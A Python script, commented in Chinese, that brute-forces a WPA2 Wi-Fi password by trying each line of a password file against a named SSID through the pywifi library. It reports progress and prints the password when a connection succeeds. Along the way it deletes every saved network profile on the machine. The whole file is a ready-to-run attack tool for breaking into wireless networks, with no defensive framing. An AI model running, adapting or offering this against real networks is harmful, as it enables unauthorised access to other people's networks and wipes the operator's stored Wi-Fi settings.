import sys

import pywifi
from pywifi import const    #获取连接状态的常量库
import time
import os

# 测试链接，返回连接结果
def wifiConnect(ifaces,pwd,ssid):
    ifaces.disconnect()
    wifistatus = ifaces.status()

    # 网卡断开链接后开始连接测试
    if wifistatus == const.IFACE_DISCONNECTED:
        # 创建wifi连接文件
        profile =  pywifi.Profile()
        # 要连接的wifi的名称  貌似不能用中文？
        profile.ssid = ssid
        # 网卡的开放状态 | auth - AP的认证算法
        profile.auth = const.AUTH_ALG_OPEN
        # wifi的加密算法，一般wifi 加密算法时wps  #选择wifi加密方式  akm - AP的密钥管理类型
        profile.akm.append(const.AKM_TYPE_WPA2PSK)

        # 加密单元 /cipher - AP的密码类型
        profile.cipher = const.CIPHER_TYPE_CCMP
        # 调用密码 /wifi密钥 如果无密码，则应该设置此项CIPHER_TYPE_NONE
        profile.key = pwd
        # 删除所有连接过的wifi文件
        ifaces.remove_all_network_profiles()
        # 加载新的连接文件
        tep_profile = ifaces.add_network_profile(profile)
        ifaces.connect(tep_profile)
        time.sleep(0.6)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        print("已有wifi连接")

# 读取密码本
def readPassword(file,ssid):
    print("开始破解：")
    # 密码本路径
    path = file
    # 打开文件
    f = open(path,"r")
    while True:
        # 一行一行读取
        lines = f.readlines()
        index = 1
        for line in lines:
            line = line.strip(" ")
            bool = wifiConnect(ifaces, line, ssid)
            if bool:
                print("密码已破解：",line)
                print("wifi已连接！")
                ifaces.network_profiles()  # 你连接上wifi的时候可以用这个试试，会返回你连接的wifi的信息
                exit()
            else:
                print("密码破解中，密码校对：",line)
                print("进度: " + str(index/len(lines)*100) + "%")
            if not line:
                print('文件已读取完，退出。')
                f.close()
                break
            index+=1

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("format is python scriptname filename ssid")
    else:
        # 抓取网卡接口
        wifi = pywifi.PyWiFi()
        # 获取第一个无线网卡
        ifaces = wifi.interfaces()[0]
        # print(ifaces.name())
        readPassword(sys.argv[1], sys.argv[2])
